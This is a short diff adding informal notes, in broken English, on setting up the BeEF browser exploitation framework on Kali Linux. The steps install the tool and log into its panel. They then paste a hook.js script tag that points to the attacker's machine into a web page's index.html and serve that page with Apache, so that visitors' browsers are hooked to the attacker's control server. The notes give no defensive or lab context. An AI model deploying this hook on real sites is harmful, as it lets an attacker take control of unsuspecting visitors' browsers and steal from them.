@@ -1,0 +1,19 @@
+apt update
+apt install beef_xss
+
++ click beef start decktop
+input pass me
+
+=> redirest web page login:
+
+username: beef
+password: input pass me on here
+
+Back console, copy <script src="http://127.0.0.1:3000/hook.js"></script> replace to index.html
+
+change IP => IP kali me
+
+start server kali: service apache2 start
+
+
++ click beef stop decktop 
